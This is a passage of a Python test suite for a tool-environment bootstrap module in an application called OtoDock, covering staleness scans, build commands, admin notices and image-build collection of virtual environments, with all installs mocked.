        await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    prune.assert_called_once_with(fake_mcps_root)


def test_uv_is_found_on_path_last(monkeypatch, tmp_path):
    monkeypatch.setattr(mcp_venv_bootstrap.os.path, "expanduser", lambda p: str(tmp_path / "none"))
    real_isfile = mcp_venv_bootstrap.os.path.isfile
    monkeypatch.setattr(mcp_venv_bootstrap.os.path, "isfile",
                        lambda p: False if p in ("/usr/local/bin/uv", "/usr/bin/uv") else real_isfile(p))
    monkeypatch.setattr(mcp_venv_bootstrap.shutil, "which",
                        lambda n: "/opt/homebrew/bin/uv" if n == "uv" else None)
    assert mcp_venv_bootstrap.find_uv() == "/opt/homebrew/bin/uv"


def test_the_interpreter_roots_are_the_sandbox_system_binds():
    from core.sandbox import sandbox_render
    binds = set(sandbox_render._SYSTEM_RO_BINDS) | set(sandbox_render._SYSTEM_RO_OPTIONAL)
    assert set(mcp_venv_bootstrap._SYSTEM_INTERPRETER_ROOTS) == binds - {"/snap/bin"}


@pytest.mark.asyncio
async def test_a_failed_rebuild_leaves_no_venv_reading_fresh(fake_mcps_root, tmp_path, monkeypatch):
    """The success mark goes before the venv: a rebuild whose install fails
    is stale at the next start, not an empty venv read as fresh."""
    monkeypatch.setattr(mcp_venv_bootstrap, "find_uv", lambda: "/fake/uv")
    mcp_dir = _custom_py(fake_mcps_root)
    _outside_venv(mcp_dir, tmp_path)
    mcp_venv_bootstrap._write_marker(
        mcp_dir, requirements_sha256=mcp_venv_bootstrap._requirements_hash(mcp_dir / "requirements.txt"),
        python=_SPEC)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=False, log="network down")):
        assert await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup() == {"py-mcp": "failed"}
    marker = _marker(mcp_dir)
    assert "requirements_sha256" not in marker and "python" not in marker
    (mcp_dir / "venv").mkdir(exist_ok=True)   # what the failed install left behind
    assert mcp_venv_bootstrap._venv_is_stale(mcp_dir / "requirements.txt", mcp_dir / "venv", mcp_dir)


@pytest.mark.asyncio
async def test_without_uv_a_venv_reads_reconciled_and_is_not_rebuilt_daily(fake_mcps_root, monkeypatch):
    mcp_dir = _custom_py(fake_mcps_root)
    monkeypatch.setattr(mcp_venv_bootstrap, "find_uv", lambda: None)
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python="")):
        assert await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup() == {"py-mcp": "ok"}
    marker = _marker(mcp_dir)
    assert marker["python"] == _SPEC and "python_pin_failed" not in marker


@pytest.mark.asyncio
async def test_without_uv_a_venv_outside_the_sandbox_stays_at_every_start(
        fake_mcps_root, tmp_path, monkeypatch, caplog):
    """Without uv a rebuild lands on the same interpreter, so every start would
    delete and remake every venv before the proxy serves."""
    monkeypatch.setattr(mcp_venv_bootstrap, "find_uv", lambda: None)
    mcp_dir = _custom_py(fake_mcps_root)
    _outside_venv(mcp_dir, tmp_path)
    mcp_venv_bootstrap._write_marker(
        mcp_dir, requirements_sha256=mcp_venv_bootstrap._requirements_hash(mcp_dir / "requirements.txt"),
        python=_SPEC)
    import os
    future = time.time() + 60
    os.utime(mcp_dir / "venv", (future, future))
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst:
        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    assert results == {"py-mcp": "fresh"}
    inst.assert_not_awaited()
    assert (mcp_dir / "venv" / "pyvenv.cfg").is_file()
    assert "install uv" in caplog.text


# ── the boot: the scan alone, and what it found stale is left out of sessions ──


def test_the_scan_builds_nothing_and_names_the_stale(fake_mcps_root, monkeypatch):
    """The scan is all a boot runs: it decides, it never builds."""
    fresh = _make_mcp(fake_mcps_root, "custom", "fresh-mcp",
                      {"name": "fresh-mcp", "server": {"runtime": "python"}})
    (fresh / "requirements.txt").write_text("x\n")
    _write_pyvenv(fresh / "venv", sys.version_info[0], sys.version_info[1])
    (fresh / "venv" / "lib" / "python3" / "site-packages" / "x.dist-info").mkdir(parents=True)
    stale = _make_mcp(fake_mcps_root, "custom", "stale-mcp",
                      {"name": "stale-mcp", "server": {"runtime": "python"}})
    (stale / "requirements.txt").write_text("x\n")
    installs: list = []
    monkeypatch.setattr(mcp_venv_bootstrap.mcp_installer, "install_mcp",
                        lambda *a, **k: installs.append(a))
    plan = mcp_venv_bootstrap.scan_bundled_venvs()
    assert plan.names == {"stale-mcp"}
    assert plan.results["fresh-mcp"] == "fresh"
    assert installs == [] and not (stale / "venv").exists()


def test_the_notice_names_the_stale_tools_by_label_and_the_command(fake_mcps_root):
    """What an admin reads once per boot: the tools by the name a person
    knows them by, and the one command that builds them."""
    for folder, label in (("b-mcp", "Bravo"), ("a-mcp", "alpha tool"), ("c-mcp", "")):
        d = _make_mcp(fake_mcps_root, "custom", folder,
                      {"name": folder, "label": label, "server": {"runtime": "python"}})
        (d / "requirements.txt").write_text("x\n")
    _make_mcp(fake_mcps_root, "custom", "docker-mcp",
              {"name": "docker-mcp", "label": "Docker", "server": {"runtime": "docker"}})
    plan = mcp_venv_bootstrap.scan_bundled_venvs()
    assert mcp_venv_bootstrap.build_notice(plan) == (
        "These tools need their environment built: alpha tool, Bravo, c-mcp. No agent can use them until "
        f"then. On the server, stop OtoDock, run {config.BASE_DIR.parent}/scripts/dev-setup.sh and start "
        "OtoDock again.")
    # The script it names is there, and it is what runs the build entry.
    script = config.BASE_DIR.parent / "scripts" / "dev-setup.sh"
    assert "services.mcp.mcp_venv_bootstrap --build" in script.read_text()


def test_no_session_is_handed_a_tool_whose_environment_is_not_built():
    """The one rule every session's tool list reads: the config, the prompt's
    catalog, the skills, the route preview and the binds agree. The reason
    is a sentence an agent can repeat to a person."""
    from services.mcp import tool_envs
    from services.mcp.mcp_session_filter import session_exclusion_reason
    manifest = SimpleNamespace(name="x-mcp", label="X Tool", exclude_from=[])
    assert session_exclusion_reason(manifest, contexts=set(), external=False) is None
    tool_envs.note_stale({"x-mcp"})
    try:
        assert session_exclusion_reason(manifest, contexts=set(), external=False) == (
            "X Tool needs its environment built. An admin stops OtoDock, runs `scripts/dev-setup.sh` on the "
            "server and starts OtoDock again.")
        assert tool_envs.stale_names() == {"x-mcp"}
        tool_envs.note_stale(set())
        assert session_exclusion_reason(manifest, contexts=set(), external=False) is None
    finally:
        tool_envs.reset_for_tests()


@pytest.mark.asyncio
async def test_a_build_asked_for_outside_its_two_entries_is_refused_and_touches_nothing(
        fake_mcps_root, tmp_path, monkeypatch):
    """A step runs a package's own code as the process's user: the server's
    process starts none. The refusal comes before the build deletes the venv
    it would make again."""
    monkeypatch.setattr(mcp_venv_bootstrap, "_build_process", False)
    monkeypatch.setattr(mcp_venv_bootstrap, "find_uv", lambda: "/fake/uv")
    mcp_dir = _custom_py(fake_mcps_root)
    _outside_venv(mcp_dir, tmp_path)
    _node_mcp_due_for_rebuild(fake_mcps_root)
    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst, \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as spawn:
        plan = mcp_venv_bootstrap.scan_bundled_venvs()
        assert plan.names == {"py-mcp", "node-mcp"}
        with pytest.raises(RuntimeError, match="never by the server"):
            await mcp_venv_bootstrap.build_bundled_venvs(plan)
        with pytest.raises(RuntimeError, match="never by the server"):
            await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
    inst.assert_not_awaited()
    spawn.assert_not_awaited()
    assert (mcp_dir / "venv" / "pyvenv.cfg").is_file()


# ─────────────────────── the build command ────────────────────────────


def test_the_build_command_builds_what_the_scan_found_stale_where_it_is(fake_mcps_root, capsys):
    """``--build``: the scan, the build of what it found stale with the
    runner the image build uses, then the prune. One line per tool, and the
    exit code says whether every build worked."""
    good = _custom_py(fake_mcps_root, "good-mcp")
    _custom_py(fake_mcps_root, "bad-mcp")
    fresh = _built_tool(fake_mcps_root, "fresh-mcp")
    _write_pyvenv(fresh / "venv", sys.version_info[0], sys.version_info[1])
    mcp_venv_bootstrap._write_marker(
        fresh, python=_SPEC,
        requirements_sha256=mcp_venv_bootstrap._requirements_hash(fresh / "requirements.txt"))
    order: list[str] = []

    async def _install(mcp_dir, runtime, source, *, run, **_kw):
        order.append(mcp_dir.name)
        assert run is mcp_installer.run_unconfined
        if mcp_dir.name == "bad-mcp":
            return InstallResult(ok=False, log=(
                "error: Couldn't parse requirement in `requirements.txt` at position 0\n"
                "  cause: Expected one of `@`, `(`, `<`, `=`, `>`, `~`, `!`, `;`, found `i`\n"
                "         this is ===not a requirement\n"
                "              ^\n\n"))
        return InstallResult(ok=True, log="ok", venv_python=_SPEC)

    def _prune(_root):
        order.append("prune")
        return []

    with patch.object(mcp_venv_bootstrap.mcp_installer, "install_mcp", _install), \
         patch.object(mcp_venv_bootstrap.mcp_installer, "prune_uv_pythons", _prune), \
         patch.object(mcp_venv_bootstrap, "venv_outside_sandbox", return_value=False):
        assert mcp_venv_bootstrap.main(["--build"]) == 1
    assert order == ["bad-mcp", "good-mcp", "prune"]
    assert capsys.readouterr().out.splitlines() == [
        "failed bad-mcp: this is ===not a requirement", "built good-mcp"]
    # Built in the checkout: nothing is moved out, the success mark is beside the tool.
    assert _marker(good)["requirements_sha256"] and (good / "manifest.json").is_file()
    assert "requirements_sha256" not in mcp_venv_bootstrap._read_marker(fake_mcps_root / "custom" / "bad-mcp")


def test_the_build_command_exits_zero_when_every_build_worked(fake_mcps_root, capsys):
    _custom_py(fake_mcps_root)
    _node_mcp_due_for_rebuild(fake_mcps_root)

    async def _spawn(*_argv, **_kw):
        return _finished_process(0, b"rebuilt")

    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", _spawn), \
         patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               return_value=InstallResult(ok=True, log="ok", venv_python=_SPEC)):
        assert mcp_venv_bootstrap.main(["--build"]) == 0
    assert capsys.readouterr().out.splitlines() == ["built node-mcp", "built py-mcp"]


@pytest.mark.parametrize(("fails", "cause"), [
    ("install", "disk full"),
    ("rebuild", "gyp ERR! build error"),
])
def test_the_build_command_names_the_cause_of_a_build_that_failed(fake_mcps_root, capsys, fails, cause):
    """An install that raises and a Node tool's addons that do not rebuild:
    each is a line with its cause and a non-zero exit."""
    if fails == "install":
        _custom_py(fake_mcps_root, "the-mcp")
    else:
        _node_mcp_due_for_rebuild(fake_mcps_root).rename(fake_mcps_root / "custom" / "the-mcp")
        (fake_mcps_root / "custom" / "the-mcp" / "manifest.json").write_text(
            json.dumps({"name": "the-mcp", "server": {"runtime": "node"}}))

    async def _spawn(*_argv, **_kw):
        return _finished_process(1, b"gyp info it worked if it ends with ok\ngyp ERR! build error\n")

    with patch("services.mcp.mcp_venv_bootstrap._node_major", return_value=24), \
         patch("asyncio.create_subprocess_exec", _spawn), \
         patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
               side_effect=RuntimeError("disk full")):
        assert mcp_venv_bootstrap.main(["--build"]) == 1
    assert capsys.readouterr().out == f"failed the-mcp: {cause}\n"


def test_the_cause_is_the_line_of_a_builds_output_that_says_what_failed():
    """pip ends on its error line, uv on the innermost reason of its chain
    or on a caret under the line it quotes: the cause is the last line with
    a word in it."""
    cause = mcp_venv_bootstrap._cause_line
    assert cause("Collecting nope\nERROR: Could not find a version\nERROR: No matching distribution found for nope\n") \
        == "ERROR: No matching distribution found for nope"
    assert cause("error: Failed to fetch\n  Caused by: client error (Connect)\n  Caused by: dns error\n\n") \
        == "Caused by: dns error"
    assert cause("  × No solution found when resolving dependencies:\n  ╰─▶ Because nope was not found\n") \
        == "╰─▶ Because nope was not found"
    assert cause("x" * 400) == "x" * 300
    assert cause("") == "" and cause("  ^\n\n") == ""


def test_the_build_command_with_nothing_stale_says_so_and_starts_nothing(fake_mcps_root, capsys):
    _make_mcp(fake_mcps_root, "custom", "docker-mcp", {"name": "docker-mcp", "server": {"runtime": "docker"}})
    with patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock) as inst, \
         patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as spawn, \
         patch("services.mcp.mcp_installer.prune_uv_pythons", return_value=[]) as prune:
        assert mcp_venv_bootstrap.main(["--build"]) == 0
    assert capsys.readouterr().out == "Nothing to build.\n"
    inst.assert_not_awaited()
    spawn.assert_not_awaited()
    prune.assert_called_once_with(fake_mcps_root)


def test_each_entry_says_its_process_is_a_builds_and_no_other_argument_does(fake_mcps_root, tmp_path, monkeypatch):
    for argv in (["--build"], ["--build-image", str(tmp_path / "out")]):
        monkeypatch.setattr(mcp_venv_bootstrap, "_build_process", False)
        assert mcp_venv_bootstrap.main(argv) == 0
        assert mcp_venv_bootstrap._build_process is True
    monkeypatch.setattr(mcp_venv_bootstrap, "_build_process", False)
    for argv in ([], ["--build", "extra"], ["--build-image"], ["--prepare"]):
        with pytest.raises(SystemExit) as stop:
            mcp_venv_bootstrap.main(argv)
        assert stop.value.code == "usage: python -m services.mcp.mcp_venv_bootstrap --build | --build-image OUT"
    assert mcp_venv_bootstrap._build_process is False


# ─────────────────────── the image build ──────────────────────────────

def _built_tool(root: Path, folder: str, *, name: str = "", marker: dict | None = None) -> Path:
    mcp_dir = _make_mcp(root, "custom", folder, {"name": name or folder, "server": {"runtime": "python"}})
    (mcp_dir / "requirements.txt").write_text("mcp==1.0\n")
    (mcp_dir / "venv" / "bin").mkdir(parents=True)
    (mcp_dir / "venv" / "pyvenv.cfg").write_text("home = /usr/local/bin\nversion = 3.13.1\n")
    (mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER).write_text(json.dumps(marker or {"python": "3.13"}))
    return mcp_dir


def test_the_image_build_moves_every_built_tools_environment_and_marker(fake_mcps_root, tmp_path):
    """Keyed by folder, never by manifest name: ``computer-mcp`` is named
    ``computer-control``."""
    a = _built_tool(fake_mcps_root, "computer-mcp", name="computer-control")
    b = _built_tool(fake_mcps_root, "memory-mcp")
    _make_mcp(fake_mcps_root, "custom", "no-venv", {"name": "no-venv", "server": {"runtime": "docker"}})
    out = tmp_path / "out"
    assert mcp_venv_bootstrap.collect_for_image(out) == []
    for folder in ("computer-mcp", "memory-mcp"):
        assert (out / "custom" / folder / "venv" / "pyvenv.cfg").is_file()
        assert (out / "custom" / folder / mcp_venv_bootstrap._RUNTIME_MARKER).is_file()
    assert not (a / "venv").exists() and not (b / mcp_venv_bootstrap._RUNTIME_MARKER).exists()
    assert not (out / "custom" / "no-venv").exists()
    assert (a / "manifest.json").is_file()


def test_the_image_build_moves_a_fetched_interpreter(fake_mcps_root, tmp_path):
    pythons = fake_mcps_root / ".uv-python"
    (pythons / "cpython-3.13").mkdir(parents=True)
    out = tmp_path / "out"
    assert mcp_venv_bootstrap.collect_for_image(out) == []
    assert (out / ".uv-python" / "cpython-3.13").is_dir()


def test_the_image_build_names_a_failed_interpreter_pin(fake_mcps_root, tmp_path):
    _built_tool(fake_mcps_root, "bad-pin", marker={"python_pin_failed": {"target": "3.13", "at": "x"}})
    assert mcp_venv_bootstrap.collect_for_image(tmp_path / "out") == ["bad-pin: its interpreter pin failed"]


@pytest.mark.parametrize("outcome", ["failed", "exception"])
def test_the_image_build_fails_on_a_tool_that_did_not_build(fake_mcps_root, tmp_path, outcome):
    with patch.object(mcp_venv_bootstrap, "ensure_bundled_venvs_at_startup",
                      AsyncMock(return_value={"memory-mcp": "ok", "tts-mcp": outcome})):
        assert mcp_venv_bootstrap.build_for_image(tmp_path / "out") == 1


def test_the_image_build_passes_when_every_tool_built(fake_mcps_root, tmp_path):
    _built_tool(fake_mcps_root, "memory-mcp")
    with patch.object(mcp_venv_bootstrap, "ensure_bundled_venvs_at_startup",
                      AsyncMock(return_value={"memory-mcp": "ok", "fresh-mcp": "fresh"})):
        assert mcp_venv_bootstrap.build_for_image(tmp_path / "out") == 0
    assert (tmp_path / "out" / "custom" / "memory-mcp" / "venv").is_dir()


def test_a_scan_after_the_image_build_reads_every_tool_fresh(fake_mcps_root, tmp_path, monkeypatch):
    """The whole point: the image's environments, moved back to their folders
    as the image's copy puts them, read ``fresh`` at the boot's scan."""
    mcp_dir = _make_mcp(fake_mcps_root, "custom", "memory-mcp",
                        {"name": "memory-mcp", "server": {"runtime": "python"}})
    (mcp_dir / "requirements.txt").write_text("mcp==1.0\n")

    async def _fake_install(mcp_path, _runtime, _source, **_kw):
        venv = Path(mcp_path) / "venv"
        (venv / "lib" / "python3.13" / "site-packages" / "x-1.dist-info").mkdir(parents=True)
        (venv / "pyvenv.cfg").write_text(
            f"home = /usr/local/bin\nversion = {sys.version_info[0]}.{sys.version_info[1]}.1\n")
        return InstallResult(ok=True, log="", venv_python="/usr/local/bin/python3")

    with patch.object(mcp_venv_bootstrap.mcp_installer, "install_mcp", _fake_install):
        out = tmp_path / "out"
        assert mcp_venv_bootstrap.build_for_image(out) == 0
    # The image's COPY puts the environment back at its folder.
    (out / "custom" / "memory-mcp" / "venv").rename(mcp_dir / "venv")
    (out / "custom" / "memory-mcp" / mcp_venv_bootstrap._RUNTIME_MARKER).rename(
        mcp_dir / mcp_venv_bootstrap._RUNTIME_MARKER)
    with patch.object(mcp_venv_bootstrap, "venv_outside_sandbox", return_value=False):
        plan = mcp_venv_bootstrap.scan_bundled_venvs()
    assert plan.results.get("memory-mcp") == "fresh" and not plan.steps
